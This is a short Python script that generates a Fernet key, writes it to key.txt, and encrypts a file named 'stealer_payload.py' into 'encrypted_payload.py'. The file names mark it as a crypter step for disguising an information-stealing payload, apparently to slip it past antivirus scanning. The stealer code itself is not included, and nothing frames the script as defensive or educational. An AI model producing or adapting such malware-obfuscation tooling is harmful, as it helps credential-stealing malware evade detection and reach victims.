from cryptography.fernet import Fernet

key = Fernet.generate_key()
print(f"🔑 Your Key: {key.decode()}")

with open("key.txt", "wb") as f:
    f.write(key)

fernet = Fernet(key)

with open("stealer_payload.py", "rb") as f:
    original = f.read()

encrypted = fernet.encrypt(original)

with open("encrypted_payload.py", "wb") as f:
    f.write(encrypted)

print("✅ Encrypted as encrypted_payload.py")
